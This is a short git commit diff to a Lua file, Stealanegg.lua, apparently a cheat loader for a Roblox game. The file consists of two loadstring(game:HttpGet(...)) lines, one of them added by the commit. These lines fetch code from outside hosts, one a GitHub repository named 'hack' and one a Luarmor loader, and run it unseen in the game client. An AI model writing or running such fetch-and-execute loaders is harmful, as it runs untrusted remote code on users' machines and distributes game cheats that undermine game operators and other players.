fd6b0cc154823637bfbff768f9600e05d7ae6e47
Dev-BaconHub <vgg8862@gmail.com>
2026-08-31 16:38:46 +0700

    Update Stealanegg.lua

--- Stealanegg.lua
+++ Stealanegg.lua
@@ -1,1 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dev-BaconHub/hack/refs/heads/main/Moduel/Stealanegg.lua"))()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/55e1b3b967bbe5a4d4b15de1ab4b4571.lua"))()
